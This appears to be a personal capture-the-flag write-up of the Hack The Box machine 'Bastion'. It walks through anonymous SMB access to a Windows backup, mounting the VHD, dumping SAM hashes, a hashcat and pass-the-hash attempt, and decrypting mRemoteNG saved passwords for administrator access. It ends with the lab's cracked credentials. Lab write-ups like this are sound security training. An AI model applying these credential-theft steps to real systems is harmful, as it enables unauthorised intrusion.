# Enumeration 
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
## open ports

```
22/tcp  open  ssh          syn-ack OpenSSH for_Windows_7.9 (protocol 2.0)     
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds


```


### Port 445


anonymous login permitted 
![[Pasted image 20230118014452.png]]

there is windows image backup 
mounting share to our machine
![[Pasted image 20230118023443.png]]
found vhd files
googling how to mound vhd in linux [StackOverFlow](https://stackoverflow.com/questions/36819474/how-can-i-attach-a-vhdx-or-vhd-file-in-linux)
Notes.txt :
![[Pasted image 20230118014729.png]]
Mounting VHD file in linux using guestmount 
Downloading dependencies 
`sudo apt-get install libguestfs-tools`
after download is done let's mount it
`sudo guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro ~/Desktop/ctf/htb/bastion/mnt/`
![[Pasted image 20230118030046.png]]

![[Pasted image 20230118030234.png]]
looks like we have windows files here
copying SAM and SYSTEM files to dump users hashes
![[Pasted image 20230118032703.png]]
we can try to Crack L4mpje hash or do pass the hash attack
we will let hashcat crack password in background and try to psexec
`hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt `
![[Pasted image 20230118033339.png]]

`psexec.py L4mpje:@$ip -hashes 'aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9'`
failed to login with psexec using the hash
failed using password
ssh succeeded we are in
![[Pasted image 20230118033819.png]]

# Privesc 

Checking programs on website found mRemoteNG
after searching found out that mRemoteNG saves passwords inside  `C:\Users\AppData\Roaming\mRemoteNG\confCons.xml`

![[Pasted image 20230118045243.png]]
![[Pasted image 20230118050611.png]]
using [mremoteng_decrypt.py](https://github.com/haseebT/mRemoteNG-Decrypt)
we are able to crack the password
![[Pasted image 20230118051026.png]]
using creds found to login with ssh
![[Pasted image 20230118051117.png]]

![[Pasted image 20230118051141.png]]

unmounting VHD `sudo guestunmount mnt` 
unmount SMB `sudo umount /mnt`
# Loot

L4mpje user creds:
	Username: L4mpje
	Password: bureaulampje

Administrator user creds:
	Username:administrator
	Password:thXLHM96BeKL0ER2

---
Tags: #ctf #htb #mremoteNG 
Resources: [Bastion](https://app.hackthebox.com/machines/Bastion)